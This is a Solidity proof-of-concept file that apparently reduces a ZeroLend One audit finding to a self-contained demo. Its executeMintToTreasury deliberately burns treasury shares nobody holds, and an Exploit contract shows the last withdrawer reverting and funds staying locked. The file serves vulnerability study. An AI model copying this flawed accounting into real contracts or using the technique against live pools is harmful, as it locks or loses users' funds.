// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*  ZeroLend One — executeMintToTreasury burns supply shares nobody holds (Sherlock #375, finding 41819)
    SYNTHETIC, cheatcode-free reduction for the EVM Playground.
    Root cause: accruedToTreasuryShares is subtracted from totalSupply.supplyShares even though
    those shares were never minted onto the treasury. The last withdrawer underflows and the
    remaining underlying stays in the pool. Blamed line preserved verbatim below (@> VULN). */

contract Asset {
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        uint256 allowed = allowance[from][msg.sender];
        if (allowed != type(uint256).max) allowance[from][msg.sender] = allowed - amount;
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

contract Sink {
    // Receives the treasury asset transfer. No special receive hook; this is an ERC20.
}

contract PoolLogic {
    struct ReserveSupplies {
        uint256 supplyShares;
        uint256 underlyingBalance;
    }

    uint256 public constant RAY = 1e27;
    Asset public asset;
    ReserveSupplies public totalSupply;
    mapping(address => uint256) public supplyBal;
    uint256 public accruedToTreasuryShares;
    bool public useFix;

    constructor(Asset _asset, bool _useFix) {
        asset = _asset;
        useFix = _useFix;
    }

    function seed(address alice, address bob, uint256 aliceShares, uint256 bobShares, uint256 accrued, uint256 underlying)
        external
    {
        supplyBal[alice] = aliceShares;
        supplyBal[bob] = bobShares;
        totalSupply.supplyShares = aliceShares + bobShares;
        totalSupply.underlyingBalance = underlying;
        accruedToTreasuryShares = accrued;
        asset.transferFrom(msg.sender, address(this), underlying);
    }

    function executeMintToTreasury(address treasury) external {
        uint256 accrued = accruedToTreasuryShares;
        if (accrued != 0) {
            accruedToTreasuryShares = 0;
            uint256 normalizedIncome = RAY;
            uint256 amountToMint = accrued * normalizedIncome / RAY;
            asset.transfer(treasury, amountToMint);
            if (useFix) {
                totalSupply.underlyingBalance -= amountToMint;
            } else {
                totalSupply.supplyShares -= accrued; // @> VULN: burns shares that were never minted to a user
                // FIX: totalSupply.underlyingBalance -= amountToMint;
            }
        }
    }

    function withdraw(address user, uint256 shares) external {
        supplyBal[user] -= shares;
        totalSupply.supplyShares -= shares;
        uint256 amount = shares * RAY / RAY;
        totalSupply.underlyingBalance -= amount;
        asset.transfer(user, amount);
    }

    function supplyShares() external view returns (uint256) {
        return totalSupply.supplyShares;
    }
}

contract Exploit {
    Asset public asset; // CREATE nonce 1
    Sink public alice; // CREATE nonce 2
    Sink public treasury; // CREATE nonce 3
    PoolLogic public pool; // CREATE nonce 4
    bool public bobReverted;
    uint256 public bobSharesLeft;
    uint256 public lockedUnderlying;

    constructor() {
        asset = new Asset();
        alice = new Sink();
        treasury = new Sink();
        pool = new PoolLogic(asset, false);
        // 200 user shares backed by 250 underlying. The extra 50 is flash-loan premium counted as
        // underlying and mirrored only in accruedToTreasuryShares, never in a user's supplyBal.
        asset.mint(address(this), 250);
        asset.approve(address(pool), 250);
        pool.seed(address(alice), address(this), 100, 100, 50, 250);
    }

    function run() external {
        pool.executeMintToTreasury(address(treasury));
        pool.withdraw(address(alice), 100);
        try pool.withdraw(address(this), 100) {
            bobReverted = false;
        } catch {
            bobReverted = true;
        }
        bobSharesLeft = pool.supplyBal(address(this));
        lockedUnderlying = asset.balanceOf(address(pool));
        require(bobReverted, "bob withdraw reverted");
        require(bobSharesLeft == 100, "bob shares remain");
        require(lockedUnderlying == 100, "100 underlying locked");
        require(asset.balanceOf(address(alice)) == 100, "alice exited");
        require(pool.supplyShares() == 50, "supply shares below the sum of balances");
    }
}
